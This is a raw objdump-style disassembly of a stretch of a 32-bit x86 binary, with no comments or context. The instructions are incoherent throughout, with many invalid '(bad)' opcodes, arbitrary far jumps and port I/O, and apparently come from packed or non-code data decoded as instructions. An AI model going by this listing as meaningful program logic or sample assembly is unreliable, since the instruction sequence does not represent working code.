  40dc8d:	mov    dl,0x4b
  40dc8f:	add    ah,BYTE PTR [edx+0x7]
  40dc92:	or     esi,DWORD PTR [edi]
  40dc94:	(bad)  
  40dc95:	rol    DWORD PTR [ebp-0x21],1
  40dc98:	jp     0x40dcb5
  40dc9a:	cld    
  40dc9b:	cmp    eax,DWORD PTR [eax]
  40dc9d:	jle    0x40dc65
  40dc9f:	mov    dl,0x1c
  40dca1:	inc    ebp
  40dca2:	enter  0x7510,0xc0
  40dca6:	inc    ecx
  40dca7:	cmc    
  40dca8:	sar    BYTE PTR [edx+esi*2],1
  40dcab:	loope  0x40dce2
  40dcad:	xor    DWORD PTR [edx],edi
  40dcaf:	(bad)  
  40dcb0:	and    al,0x22
  40dcb2:	add    ecx,esi
  40dcb4:	add    BYTE PTR [ebp+0x61],dl
  40dcb7:	inc    ebx
  40dcb8:	or     eax,0x56f4e5a9
  40dcbd:	adc    al,0xd6
  40dcbf:	outs   dx,BYTE PTR ds:[esi]
  40dcc0:	je     0x40dca2
  40dcc2:	dec    esi
  40dcc3:	arpl   bx,bp
  40dcc5:	outs   dx,BYTE PTR ds:[esi]
  40dcc6:	outs   dx,DWORD PTR ds:[esi]
  40dcc7:	or     ah,BYTE PTR [ebp+0x43]
  40dcca:	repz mov ecx,0xa9c2ddcd
  40dcd0:	aam    0xd0
  40dcd2:	jp     0x40dcb5
  40dcd4:	sub    al,0x41
  40dcd6:	pop    ds
  40dcd7:	pop    ds
  40dcd8:	into   
  40dcd9:	mov    edi,0xbe3f2a82
  40dcde:	adc    ebx,DWORD PTR [edx+eax*1]
  40dce1:	rcl    DWORD PTR [eax],cl
  40dce3:	or     al,0x4b
  40dce5:	mov    dh,dh
  40dce7:	leave  
  40dce8:	inc    ecx
  40dce9:	dec    edi
  40dcea:	and    eax,0xcb22f918
  40dcef:	adc    ecx,DWORD PTR [esi-0x2f]
  40dcf2:	dec    esp
  40dcf3:	shl    DWORD PTR [ecx],1
  40dcf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcf6:	jno    0x40dc7d
  40dcf8:	mov    bh,BYTE PTR [edx]
  40dcfa:	inc    ebp
  40dcfb:	cmp    al,0xb8
  40dcfd:	mov    ebx,0xd4e48e29
  40dd02:	test   ebx,edx
  40dd04:	(bad)  
  40dd05:	fnstenv [edx]
  40dd07:	pxor   mm6,QWORD PTR [ebx+0x211ebec0]
  40dd0e:	je     0x40dd38
  40dd10:	adc    BYTE PTR [ebx],dh
  40dd12:	lea    ebp,[eax-0x60966b21]
  40dd18:	lods   al,BYTE PTR ds:[esi]
  40dd19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd1a:	or     al,0x98
  40dd1c:	scas   eax,DWORD PTR es:[edi]
  40dd1d:	push   cs
  40dd1e:	xor    edi,0x3
  40dd21:	std    
  40dd22:	cmp    edx,ebx
  40dd24:	and    dh,BYTE PTR [ecx]
  40dd26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd27:	adc    edx,ecx
  40dd29:	popf   
  40dd2a:	jg     0x40dd94
  40dd2c:	cmp    BYTE PTR [edi+0x18533150],bh
  40dd32:	xchg   edi,eax
  40dd33:	mov    BYTE PTR ds:0x6edce559,0x4
  40dd3a:	xchg   ebx,eax
  40dd3b:	stos   BYTE PTR es:[edi],al
  40dd3c:	aas    
  40dd3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd3f:	test   al,0x5f
  40dd41:	pop    esp
  40dd42:	iret   
  40dd43:	fiadd  WORD PTR [eax+0xdd00c96]
  40dd49:	loopne 0x40dd94
  40dd4b:	cli    
  40dd4c:	iret   
  40dd4d:	mov    ebx,0xb5da6895
  40dd52:	loope  0x40dd07
  40dd54:	out    0x54,eax
  40dd56:	push   0x666cf93d
  40dd5b:	pop    ebx
  40dd5c:	or     DWORD PTR [edx+0x359c8265],0x4c9cf5dd
  40dd66:	dec    edx
  40dd67:	jl     0x40ddc3
  40dd69:	aaa    
  40dd6a:	push   ds
  40dd6b:	ds inc ebx
  40dd6d:	push   ebx
  40dd6e:	fwait
  40dd6f:	pop    edx
  40dd70:	sub    eax,0x99798346
  40dd75:	in     al,0x0
  40dd77:	xchg   DWORD PTR [edi-0x2116db2a],edx
  40dd7d:	into   
  40dd7e:	ds shl ah,1
  40dd81:	ins    DWORD PTR es:[edi],dx
  40dd82:	sbb    eax,0x68839e9f
  40dd87:	in     al,0x7b
  40dd89:	jmp    0xeff8:0xe0c6c589
  40dd90:	je     0x40dd17
  40dd92:	in     al,0xdf
  40dd94:	pop    ecx
  40dd95:	mov    bh,dh
  40dd97:	xor    al,0x23
  40dd99:	push   eax
  40dd9a:	imul   edx,DWORD PTR [ebp-0x5c3377ad],0x6778fab3
  40dda4:	mov    edi,0x73e281ca
  40dda9:	xor    ch,BYTE PTR [ecx]
  40ddab:	xchg   ecx,eax
  40ddac:	inc    eax
  40ddad:	push   ds
  40ddae:	sahf   
  40ddaf:	xchg   esi,eax
  40ddb0:	fwait
  40ddb1:	in     eax,0x22
  40ddb3:	js     0x40dd39
  40ddb5:	ret    
  40ddb6:	mov    ecx,ds
  40ddb8:	ss or  eax,0xf8823295
  40ddbe:	dec    ebp
  40ddbf:	lods   eax,DWORD PTR ds:[esi]
  40ddc0:	into   
  40ddc1:	pop    ebx
  40ddc2:	inc    esp
  40ddc3:	nop
  40ddc4:	lods   eax,DWORD PTR ds:[esi]
  40ddc5:	dec    ebx
  40ddc6:	mov    al,0xcb
  40ddc8:	stos   BYTE PTR es:[edi],al
  40ddc9:	mov    edx,0xbc6d85d3
  40ddce:	(bad)  
  40ddd0:	pop    edi
  40ddd1:	imul   esi,DWORD PTR [ecx-0xe719801],0xffffffff
  40ddd8:	imul   ebp,DWORD PTR [eax+eiz*4],0x52453c58
  40dddf:	fld    QWORD PTR [eax+ecx*2]
  40dde2:	sbb    DWORD PTR [ecx-0x6b0eca0d],edi
  40dde8:	mov    al,BYTE PTR [esi-0x14]
  40ddeb:	es push ecx
  40dded:	das    
  40ddee:	fstp   QWORD PTR [esi+0x53772976]
  40ddf4:	repnz test al,0x4f
  40ddf7:	rcr    BYTE PTR [eax-0x18],1
  40ddfa:	pop    ds
  40ddfb:	pop    ds
  40ddfc:	xor    dh,BYTE PTR [ebp-0x30]
  40ddff:	xor    BYTE PTR [esi],cl
  40de01:	dec    dh
  40de03:	pop    ecx
  40de04:	jmp    0x40de34
  40de06:	pop    ss
  40de07:	fld    DWORD PTR [ebp+0x1fb9818e]
  40de0d:	neg    DWORD PTR [edx+esi*1+0x57]
  40de11:	sub    DWORD PTR [ebp+0x1f],ebx
  40de14:	jmp    0x4cced63
  40de19:	in     al,dx
  40de1a:	xchg   esp,eax
  40de1b:	adc    eax,DWORD PTR [ecx-0x356e8e60]
  40de21:	stos   DWORD PTR es:[edi],eax
  40de22:	iret   
  40de23:	sahf   
  40de24:	in     eax,0x8a
  40de26:	adc    eax,0x4766a0dc
  40de2b:	imul   ebx,DWORD PTR [edi+eiz*2+0x41],0xf0b61bb9
  40de33:	mov    BYTE PTR [eax+0x57a6c9f3],cl
  40de39:	ds jp  0x40de86
  40de3c:	cmp    BYTE PTR [edi-0x53],bh
  40de3f:	sbb    al,0xd0
  40de41:	enter  0x7ae2,0x74
  40de45:	bound  ebp,QWORD PTR [ecx+0x16]
  40de48:	lock or BYTE PTR [eax+edi*2],dh
  40de4c:	sub    eax,0xccbf69a0
  40de51:	hlt    
  40de52:	mov    ah,0xe9
  40de54:	push   eax
  40de55:	mov    esp,0xe17643e0
  40de5a:	or     ebp,DWORD PTR [esi+0x44]
  40de5d:	in     eax,0x94
  40de5f:	push   ds
  40de60:	stos   BYTE PTR es:[edi],al
  40de61:	lds    eax,FWORD PTR [eax]
  40de63:	cmc    
  40de64:	dec    esp
  40de65:	repnz and al,0x6e
  40de68:	inc    edi
  40de69:	lea    esp,[edx]
  40de6b:	shl    BYTE PTR [ebx+eax*4],cl
  40de6e:	les    edi,FWORD PTR [ecx-0x6c]
  40de71:	bound  esp,QWORD PTR [ecx-0x49]
  40de74:	mov    eax,0xfbefe53c
  40de79:	scas   al,BYTE PTR es:[edi]
  40de7a:	fimul  WORD PTR [esi+esi*8]
  40de7d:	inc    ecx
  40de7e:	je     0x40dee4
  40de80:	xor    al,al
  40de82:	mov    esi,esi
  40de84:	sub    cl,BYTE PTR [edi]
  40de86:	mov    ds:0x40435157,eax
  40de8b:	and    al,0xe1
  40de8d:	mov    ebp,0xf08f228e
  40de92:	xor    eax,ebp
  40de94:	gs mov esi,esp
  40de97:	sub    cl,bl
  40de99:	mov    WORD PTR [edi+0x5237b913],gs
  40de9f:	add    bh,BYTE PTR [edi-0x4e]
  40dea2:	push   esi
  40dea3:	fnstsw WORD PTR [ecx+0xa15cbdc]
  40dea9:	dec    esp
  40deaa:	inc    eax
  40deab:	push   esp
  40deac:	fs inc esp
  40deae:	mov    ah,0x5e
  40deb0:	test   eax,0x870fd26d
  40deb5:	jno    0x40de96
  40deb7:	sbb    al,0x3f
  40deb9:	mov    ebp,?
  40debb:	mov    bh,0xbc
  40debd:	pop    ecx
  40debe:	pushf  
  40debf:	popf   
  40dec0:	push   esi
  40dec1:	mov    edx,0x66f747d
  40dec6:	and    al,0x1c
  40dec8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dec9:	jae    0x40de90
  40decb:	xchg   ebx,eax
  40decc:	aas    
  40decd:	xchg   ecx,eax
  40dece:	adc    dh,BYTE PTR [edi]
  40ded0:	test   BYTE PTR [esp+edx*1+0x66cc5bdd],cl
  40ded7:	iret   
  40ded8:	mov    esi,DWORD PTR [edx+0x78]
  40dedb:	pop    ebx
  40dedc:	mov    dh,0xa9
  40dede:	(bad)
  40dee1:	rcr    DWORD PTR [ecx+0x1d],1
  40dee4:	dec    ecx
  40dee5:	pushf  
  40dee6:	push   edi
  40dee7:	inc    edx
  40dee8:	mov    edx,0xbb9d1f99
  40deed:	add    al,0x5a
  40deef:	mov    al,ds:0xb5981e07
  40def4:	or     al,0x7b
  40def6:	stos   BYTE PTR es:[edi],al
  40def7:	push   edi
  40def8:	into   
  40def9:	es dec esi
  40defb:	scas   al,BYTE PTR es:[edi]
  40defc:	out    dx,eax
  40defd:	xchg   DWORD PTR [ebp-0x3a],edi
  40df00:	sbb    bl,0x60
  40df03:	cmp    cl,BYTE PTR ds:0xeff644e6
  40df09:	xchg   al,bl
  40df0b:	pop    ds
  40df0c:	lea    edi,[eax]
  40df0e:	pop    esi
  40df0f:	test   BYTE PTR ds:0xd0d02763,ch
  40df15:	pop    eax
  40df16:	xchg   DWORD PTR [edi],ecx
  40df18:	sbb    bl,bh
  40df1a:	mov    al,0x6a
  40df1c:	sbb    DWORD PTR [ebx],ebp
  40df1e:	daa    
  40df1f:	sub    BYTE PTR [edx-0x3d],ch
  40df22:	fdivr  QWORD PTR [eax]
  40df24:	xchg   DWORD PTR [ebx-0x42],eax
  40df27:	adc    al,0x3a
  40df29:	and    al,0xe7
  40df2b:	mov    al,0x56
  40df2d:	sbb    edi,DWORD PTR [ebp+0x68]
  40df30:	je     0x40df5c
  40df32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df33:	mov    ch,0x5b
  40df35:	push   esi
  40df36:	fnsave [edx+0x19767514]
  40df3c:	fcmovbe st,st(3)
  40df3e:	and    edx,DWORD PTR [edx]
  40df40:	push   es
  40df41:	pop    ebp
  40df42:	pop    eax
  40df43:	in     al,dx
  40df44:	retf   0x7ea7
  40df47:	(bad)  
  40df48:	aam    0xb5
  40df4a:	inc    eax
  40df4b:	mov    esp,0x5ee6e211
  40df50:	retf   
  40df51:	shl    ecx,0xc0
  40df54:	ret    
  40df55:	sub    DWORD PTR [edi],edx
  40df57:	adc    edi,DWORD PTR [eax]
  40df59:	xchg   edi,eax
  40df5a:	sar    BYTE PTR [ecx],0xdc
  40df5d:	inc    BYTE PTR [ebp-0x4962740d]
  40df63:	jo     0x40dfc8
  40df65:	(bad)  
  40df66:	out    0x40,eax
  40df68:	push   0xcde1cbd3
  40df6d:	ds jp  0x40df5c
  40df70:	pop    ds
  40df71:	lods   al,BYTE PTR ds:[esi]
  40df72:	xchg   ebp,eax
  40df73:	(bad)  
  40df74:	jl     0x40df6a
  40df76:	xchg   ecx,eax
  40df77:	and    al,0xe1
  40df79:	ret    
  40df7a:	mov    edi,0x4bdd117e
  40df7f:	pop    edi
  40df80:	or     al,0xae
  40df82:	inc    ecx
  40df83:	mov    esi,0xa202275e
  40df88:	jmp    0x287:0xed758208
  40df8f:	jne    0x40dff0
  40df91:	sbb    al,0xfe
  40df93:	push   esi
  40df94:	jge    0x40e006
  40df96:	(bad)  
  40df97:	xor    al,bh
  40df99:	scas   al,BYTE PTR es:[edi]
  40df9a:	out    0x96,eax
  40df9c:	cli    
  40df9d:	mov    ds:0x77239541,al
  40dfa2:	jmp    0xb4d0:0x46e2d6c2
  40dfa9:	gs popf 
  40dfab:	mov    al,ds:0xfa3f730c
  40dfb0:	xchg   edi,eax
  40dfb1:	mov    bl,0xa4
  40dfb3:	arpl   di,di
  40dfb5:	mov    bh,0x47
  40dfb7:	push   0xffffffeb
  40dfb9:	inc    edx
  40dfba:	dec    esi
  40dfbb:	cli    
  40dfbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfbd:	xchg   bh,bh
  40dfbf:	mov    ebx,0x582a282a
  40dfc4:	pushf  
  40dfc5:	or     al,0x17
  40dfc7:	outs   dx,BYTE PTR ds:[esi]
  40dfc8:	dec    esi
  40dfc9:	and    eax,0x4924b62a
  40dfce:	xor    eax,0x88e4585
  40dfd3:	hlt    
  40dfd4:	stc    
  40dfd5:	out    0x8e,eax
  40dfd7:	mov    edx,0x7125f982
  40dfdc:	repnz xor al,0x52
  40dfdf:	mov    DWORD PTR [edx],0x338bc351
  40dfe5:	es aam 0x63
  40dfe8:	pop    ds
  40dfe9:	jg     0x40e04a
  40dfeb:	fwait
  40dfec:	or     ah,BYTE PTR [ebx-0x63]
  40dfef:	rcr    DWORD PTR [eax+0x26],1
  40dff2:	pop    edx
  40dff3:	pop    esi
  40dff4:	sbb    edi,DWORD PTR [edx+0x271a42c9]
  40dffa:	push   esp
  40dffb:	nop
  40dffc:	cmc    
  40dffd:	and    al,0x3e
  40dfff:	cmp    eax,0x2b09c435
  40e004:	mov    fs,ebp
  40e006:	ss pushf 
  40e008:	mov    cl,ah
  40e00a:	mov    DWORD PTR [edi+eax*1],ebx
  40e00d:	sar    BYTE PTR [edx+esi*1-0x340d4dd3],1
  40e014:	outs   dx,BYTE PTR ds:[esi]
  40e015:	mov    gs,edx
  40e017:	scas   al,BYTE PTR es:[edi]
  40e018:	mov    bl,0xe1
  40e01a:	test   dl,0x3c
  40e01d:	xlat   BYTE PTR ds:[ebx]
  40e01e:	popf   
  40e01f:	lock adc eax,0x49abd13a
  40e025:	retf   
  40e026:	sbb    DWORD PTR [edx+edi*1],0x3caba16e
  40e02d:	xchg   esi,eax
  40e02e:	dec    esi
  40e02f:	mov    ch,0x6c
  40e031:	mov    eax,ds:0x5b685d20
  40e036:	or     ch,BYTE PTR [edx]
  40e038:	mov    BYTE PTR [edx],al
  40e03a:	push   cs
  40e03b:	out    0x32,eax
  40e03d:	bound  edi,QWORD PTR [ebp-0x560e08d]
  40e043:	xchg   BYTE PTR [ebp+ebx*4-0x18],bl
  40e047:	xor    bl,BYTE PTR [ecx-0x33f27893]
  40e04d:	or     eax,0x5ffdcbfe
  40e052:	out    0xac,eax
  40e054:	mov    eax,0xc66046d6
  40e059:	sbb    BYTE PTR [esi],cl
  40e05b:	dec    eax
  40e05c:	cwde   
  40e05d:	mov    al,ds:0x2866b71c
  40e062:	mov    ds:0xba20fae1,eax
  40e067:	sub    dh,BYTE PTR [esp+esi*1+0x26f7db91]
  40e06e:	fld    TBYTE PTR [eax+ecx*2-0x2c]
  40e072:	xchg   edx,eax
  40e073:	stos   DWORD PTR es:[edi],eax
  40e074:	aad    0x5d
  40e076:	sbb    al,0xa0
  40e078:	mov    ds:0xcbb38af2,al
  40e07d:	rcl    DWORD PTR [edi+0x65],cl
  40e080:	icebp  
  40e081:	mov    ah,0x2b
  40e083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e084:	into   
  40e085:	in     eax,dx
  40e086:	leave  
  40e087:	mov    ch,bl
  40e089:	sti    
  40e08a:	cwde   
  40e08b:	ret    
  40e08c:	in     eax,0xf5
  40e08e:	neg    DWORD PTR [esi+edx*2-0x5cb540a7]
  40e095:	test   ebx,ebp
  40e097:	mov    ch,0xac
  40e099:	push   0xa4244e86
  40e09e:	mov    esp,0xada83fd5
  40e0a3:	js     0x40e0d7
  40e0a5:	inc    edx
  40e0a6:	and    al,0xe7
  40e0a8:	fstp   DWORD PTR [ebp+0x2641d77e]
  40e0ae:	or     eax,0xda6cb89
  40e0b3:	in     al,0x5f
  40e0b5:	jge    0x40e048
  40e0b7:	dec    ecx
  40e0b8:	mov    edi,0x6f52a16f
  40e0bd:	aaa    
  40e0be:	stc    
  40e0bf:	std    
  40e0c0:	mov    ecx,0x6c4ea98f
  40e0c5:	out    dx,eax
  40e0c6:	scas   al,BYTE PTR es:[edi]
  40e0c7:	cdq    
  40e0c8:	xor    BYTE PTR [edi-0x59bc62db],al
  40e0ce:	ja     0x40e07c
  40e0d0:	pop    esi
  40e0d1:	inc    esi
  40e0d2:	fsub   st,st(2)
  40e0d4:	pop    eax
  40e0d5:	fs inc edi
  40e0d7:	(bad)  
  40e0d8:	lahf   
  40e0d9:	cs jp  0x40e103
  40e0dc:	inc    ebx
  40e0dd:	sub    eax,0xa2807abd
  40e0e2:	(bad)  
  40e0e3:	icebp  
  40e0e4:	pop    ss
  40e0e5:	dec    edi
  40e0e6:	mov    dh,0x82
  40e0e8:	sub    al,bh
  40e0ea:	shl    BYTE PTR [ecx-0x61],0xf9
  40e0ee:	les    eax,FWORD PTR [ecx]
  40e0f0:	out    0x1d,al
  40e0f2:	lock lea ebp,[ebx+0x4f]
  40e0f6:	push   ecx
  40e0f7:	rcr    DWORD PTR [ebx],cl
  40e0f9:	dec    eax
  40e0fa:	jmp    0x4055:0x27bbee14
  40e101:	pop    ds
  40e102:	push   ds
  40e103:	mov    ds:0xa3e5ffac,eax
  40e108:	test   al,0x2f
  40e10a:	aas    
  40e10b:	mov    ebp,cs
  40e10d:	mov    ch,0x1b
  40e10f:	sahf   
  40e110:	xchg   ebp,eax
  40e111:	mov    dh,0xb0
  40e113:	push   cs
  40e114:	mov    eax,ds:0xf8dfd77e
  40e119:	cs das 
  40e11b:	call   0x1a917972
  40e120:	test   eax,0xf360e5ab
  40e125:	ret    0xd114
  40e128:	pusha  
  40e129:	xchg   DWORD PTR [esi],ebx
  40e12b:	mov    edx,0x5f52c8e3
  40e130:	mov    esi,0xb9b46974
  40e135:	mov    ?,WORD PTR [esi-0x2eb147d0]
  40e13b:	dec    esp
  40e13c:	mov    edi,0xb0083178
  40e141:	dec    edi
  40e142:	mov    DWORD PTR [esi+0x156ee292],ecx
  40e148:	pop    es
  40e149:	lahf   
  40e14a:	fs test eax,0x86646012
  40e150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e151:	addr16 sub eax,0x1edf1bfb
  40e157:	xor    BYTE PTR [eax+0x6a],ah
  40e15a:	dec    ebx
  40e15b:	mov    ebx,DWORD PTR [eax]
  40e15d:	int    0xaf
  40e15f:	das    
  40e160:	clc    
  40e161:	jp     0x40e14d
  40e163:	push   0x57
  40e165:	mov    ds:0x879755f3,al
  40e16a:	push   ds
  40e16b:	add    eax,0x7ff550ed
  40e170:	adc    al,0x68
  40e172:	cmc    
  40e173:	lods   al,BYTE PTR ds:[esi]
  40e174:	(bad)  
  40e175:	in     al,0xe6
  40e177:	ja     0x40e1f6
  40e179:	or     BYTE PTR [ebp-0x6f0950d2],dh
  40e17f:	jmp    0x701:0x23968209
  40e186:	jmp    0x7bdeece2
  40e18b:	or     DWORD PTR ds:0x65656c4f,ebp
  40e191:	popf   
  40e192:	fld    TBYTE PTR [ecx+0x7ec1dee4]
  40e198:	stos   BYTE PTR es:[edi],al
  40e199:	shl    ah,1
  40e19b:	into   
  40e19c:	rcl    DWORD PTR [esi],1
  40e19e:	mov    es,WORD PTR [eax]
  40e1a0:	pushf  
  40e1a1:	mov    ecx,0x746505c7
  40e1a6:	cmp    DWORD PTR [edx+0x6c263489],ebp
  40e1ac:	lahf   
  40e1ad:	cmp    al,BYTE PTR [ebx+0x41aa7632]
  40e1b3:	lods   eax,DWORD PTR ds:[esi]
  40e1b4:	jb     0x40e146
  40e1b6:	sub    ah,BYTE PTR [edi+0xdc102ef]
  40e1bc:	aad    0x14
  40e1be:	mov    edi,0xf74fbc4c
  40e1c3:	xchg   edx,eax
  40e1c4:	mov    dl,0x63
  40e1c6:	cmp    esi,ebp
  40e1c8:	mov    bl,0xce
  40e1ca:	and    dh,BYTE PTR ds:0xb0e3860d
  40e1d0:	fldcw  WORD PTR ds:0x3ab1d2db
  40e1d6:	pop    ebp
  40e1d7:	push   ebx
  40e1d8:	call   0xabbe5d3e
  40e1dd:	imul   edx,DWORD PTR [edi-0x7282807a],0xd6236caf
  40e1e7:	scas   eax,DWORD PTR es:[edi]
  40e1e8:	shr    BYTE PTR [eax],0x4b
  40e1eb:	and    al,0xc7
  40e1ed:	and    DWORD PTR ds:0xcd72ac3d,esi
  40e1f3:	add    ebx,DWORD PTR [esp+ecx*1+0x41]
  40e1f7:	dec    ebx
  40e1f8:	xor    ecx,DWORD PTR [edx+0x5d444462]
  40e1fe:	xchg   edx,eax
  40e1ff:	das    
  40e200:	push   ecx
  40e201:	fnsave [ebx-0x69adae87]
  40e207:	aas    
  40e208:	xchg   edx,eax
  40e209:	xor    DWORD PTR [ecx+0x49],ecx
  40e20c:	inc    ebp
  40e20d:	and    edi,DWORD PTR [eax+edx*2]
  40e210:	inc    ecx
  40e211:	cmp    bl,al
  40e213:	or     eax,0x11790d76
  40e218:	xchg   ebp,eax
  40e219:	xor    DWORD PTR [ecx*2-0x6aa58417],0xa5f14b2
  40e224:	sub    ecx,DWORD PTR [eax+ebx*1+0x23]
  40e228:	mov    ebx,0x74e092f5
  40e22d:	pop    es
  40e22e:	jg     0x40e1f4
  40e230:	mov    BYTE PTR [edi+edi*2-0x66],cl
  40e234:	(bad)  
  40e235:	jle    0x40e298
  40e237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e238:	push   edi
  40e239:	loop   0x40e287
  40e23b:	stc    
  40e23c:	aam    0xa4
  40e23e:	popa   
  40e23f:	aaa    
  40e240:	mov    edx,0xbabd7ddb
  40e245:	sub    al,0x5b
  40e247:	mov    cl,0xc5
  40e249:	adc    al,0x1e
  40e24b:	(bad)  
  40e24c:	xor    DWORD PTR [ebx],ebp
  40e24e:	dec    edi
  40e24f:	imul   esp,DWORD PTR [eax+ecx*8],0xfffffffa
  40e253:	nop
  40e254:	or     BYTE PTR [edx+0x4b30db34],bh
  40e25a:	fisubr WORD PTR [esi+0x655d515]
  40e260:	sub    eax,0x7fe9582e
  40e265:	fwait
  40e266:	push   esp
  40e267:	sbb    BYTE PTR [edi],dh
  40e269:	dec    edi
  40e26a:	pushf  
  40e26b:	pusha  
  40e26c:	inc    edi
  40e26d:	stos   BYTE PTR es:[edi],al
  40e26e:	imul   esi,eax,0x3277a9c
  40e274:	cmp    DWORD PTR [ebx],0x5a
  40e277:	es ins DWORD PTR es:[edi],dx
  40e279:	jbe    0x40e27e
  40e27b:	shr    dh,1
  40e27d:	ficom  DWORD PTR [esi]
  40e27f:	dec    esp
  40e280:	lods   eax,DWORD PTR ds:[esi]
  40e281:	rcr    DWORD PTR [esi],0xbd
  40e284:	fwait
  40e285:	in     al,0x83
  40e287:	mov    ds:0xca7fca1f,al
  40e28c:	icebp  
  40e28d:	mov    bh,0x2
  40e28f:	inc    ebp
  40e290:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e291:	xchg   ecx,eax
  40e292:	lahf   
  40e293:	add    ebx,DWORD PTR [esi-0x47]
  40e296:	push   ss
  40e297:	xchg   edi,eax
  40e298:	test   BYTE PTR [esi],dl
  40e29a:	xchg   ecx,eax
  40e29b:	leave  
  40e29c:	sbb    DWORD PTR [ebx],0xdcd847cd
  40e2a2:	aam    0x17
  40e2a4:	mov    al,ds:0xfb5413a1
  40e2a9:	cli    
  40e2aa:	mov    dh,BYTE PTR [ebp+0x49]
  40e2ad:	out    dx,al
  40e2ae:	fs call 0xab79bf9d
  40e2b4:	(bad)  
  40e2b5:	test   eax,0xb882e149
  40e2ba:	mov    bh,0xe0
  40e2bc:	(bad)  
  40e2bd:	in     eax,dx
  40e2be:	jmp    0xeb578bfd
  40e2c3:	mov    ebx,0x86879d3f
  40e2c8:	aas    
  40e2c9:	inc    ebx
  40e2ca:	not    ch
  40e2cc:	iret   
  40e2cd:	xor    DWORD PTR [esi+ebx*8+0x52ef098c],eax
  40e2d4:	jl     0x40e295
  40e2d6:	inc    bh
  40e2d8:	std    
  40e2d9:	ficomp DWORD PTR [eax+ecx*1+0x43]
  40e2dd:	adc    dh,cl
  40e2df:	popa   
  40e2e0:	shr    BYTE PTR [eax+0x2d],1
  40e2e3:	sub    DWORD PTR [eax],esp
  40e2e5:	push   0xc8676e1c
  40e2ea:	js     0x40e351
  40e2ec:	dec    esi
  40e2ed:	test   al,0xfc
  40e2ef:	aaa    
  40e2f0:	dec    edx
  40e2f1:	outs   dx,DWORD PTR ds:[esi]
  40e2f2:	mov    ebp,0x8f10a40d
  40e2f7:	and    bl,ah
  40e2f9:	lods   al,BYTE PTR ds:[esi]
  40e2fa:	leave  
  40e2fb:	mov    al,ds:0x4da04bb4
  40e300:	outs   dx,DWORD PTR gs:[esi]
  40e302:	jae    0x40e2fa
  40e304:	scas   al,BYTE PTR es:[edi]
  40e305:	neg    dh
  40e307:	test   al,0xce
  40e309:	pop    ds
  40e30a:	mov    ah,0xf5
  40e30d:	fsub   DWORD PTR [edx-0x4396d58e]
  40e313:	jmp    0x9789:0x72e3e539
  40e31a:	not    DWORD PTR [ecx]
  40e31c:	fs aam 0x6f
  40e31f:	retf   0x6970
  40e322:	xchg   esp,eax
  40e323:	pushf  
  40e324:	popa   
  40e325:	ret    
  40e326:	pushf  
  40e327:	or     al,0x57
  40e329:	mov    ds:0x4d56d84,al
  40e32e:	xor    edi,DWORD PTR [ecx+0x4d]
  40e331:	daa    
  40e332:	cmp    eax,0x760162e9
  40e337:	fisttp QWORD PTR [eax]
  40e339:	dec    ebx
  40e33a:	push   ds
  40e33b:	mov    ds:0x93b8f66c,al
  40e340:	in     eax,0x6b
  40e342:	stc    
  40e343:	push   edi
  40e344:	sbb    al,0xbc
  40e346:	push   cs
  40e347:	sbb    ch,bh
  40e349:	mov    ah,0xa6
  40e34b:	shl    DWORD PTR [ebp+0x46bf058b],1
  40e351:	jg     0x40e321
  40e353:	data16 ins BYTE PTR es:[edi],dx
  40e355:	leave  
  40e356:	int3   
  40e357:	jmp    0xbf01d5df
  40e35c:	push   edx
  40e35d:	clc    
  40e35e:	fsub   QWORD PTR [eax+esi*2]
  40e361:	fs push eax
  40e364:	jo     0x40e308
  40e366:	and    bl,BYTE PTR [edi]
  40e368:	or     al,0xc1
  40e36a:	and    bl,BYTE PTR [ecx+0x5d]
  40e36d:	lock cmp BYTE PTR [ecx+0x2773979],ch
  40e374:	jbe    0x40e313
  40e376:	es inc ebx
  40e378:	and    edi,esp
  40e37a:	icebp  
  40e37b:	lods   eax,DWORD PTR ds:[esi]
  40e37c:	fild   QWORD PTR [ecx-0x6dce3bb3]
  40e382:	leave  
  40e383:	retf   
  40e384:	or     ecx,edx
  40e386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e387:	sbb    ch,al
  40e389:	fcmovbe st,st(6)
  40e38b:	mov    eax,ds:0xb748bc8c
  40e390:	jl     0x40e3e2
  40e392:	jbe    0x40e38c
  40e394:	dec    ecx
  40e395:	cmp    al,BYTE PTR [edx]
  40e397:	ret    
  40e398:	dec    esp
  40e399:	dec    ecx
  40e39a:	mov    edx,0x70712bc2
  40e39f:	mov    bl,0xba
  40e3a1:	arpl   WORD PTR [eax+0x18],bp
  40e3a4:	outs   dx,BYTE PTR ds:[esi]
  40e3a5:	add    DWORD PTR [edi],0xffffff8a
  40e3a8:	push   ds
  40e3a9:	lahf   
  40e3aa:	or     esp,DWORD PTR [edi-0x47]
  40e3ad:	or     ebp,DWORD PTR [eax+0x1a16e9cf]
  40e3b3:	sahf   
  40e3b4:	dec    esp
  40e3b5:	sub    BYTE PTR [esi+0x3f],al
  40e3b8:	sbb    DWORD PTR [ebx+0x75],edx
  40e3bb:	fdiv   QWORD PTR [ebx+0x30c64a16]
  40e3c1:	sbb    eax,0x9d4a2f2b
  40e3c6:	ins    DWORD PTR es:[edi],dx
  40e3c7:	adc    eax,0xdbf8c37f
  40e3cc:	and    bl,bl
  40e3ce:	jae    0x40e3a7
  40e3d0:	mov    ch,BYTE PTR [eax-0x40ea473e]
  40e3d6:	(bad)  
  40e3d7:	and    dh,al
  40e3d9:	call   0x6c2c:0x35df789d
  40e3e0:	sub    edx,0x6d
  40e3e3:	add    ebp,edx
  40e3e5:	and    eax,0x5d40017e
  40e3ea:	lds    eax,FWORD PTR [ebx+ebx*4+0x4f]
  40e3ee:	jne    0x40e3b0
  40e3f0:	cmp    BYTE PTR [ebp+0x36c56aa7],cl
  40e3f6:	loope  0x40e468
  40e3f8:	clc    
